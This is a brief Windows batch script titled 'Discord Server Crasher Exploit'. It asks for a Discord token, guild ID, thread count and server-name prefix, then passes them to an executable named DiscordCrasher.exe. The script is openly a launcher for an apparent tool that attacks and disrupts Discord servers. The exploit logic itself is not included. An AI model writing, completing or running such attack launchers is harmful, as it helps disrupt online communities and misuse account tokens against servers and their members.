@echo off
title Discord Server Crasher Exploit 
color 0b

set /p token="Token: "
set /p guildid="Guild ID: "
set /p threads="Threads: "
set /p prefix="Server Name: "
set /p log="Log? (0/1): "

DiscordCrasher.exe --token %token% --guild-id %guildid% --threads %threads% --prefix %prefix% --log %log%
pause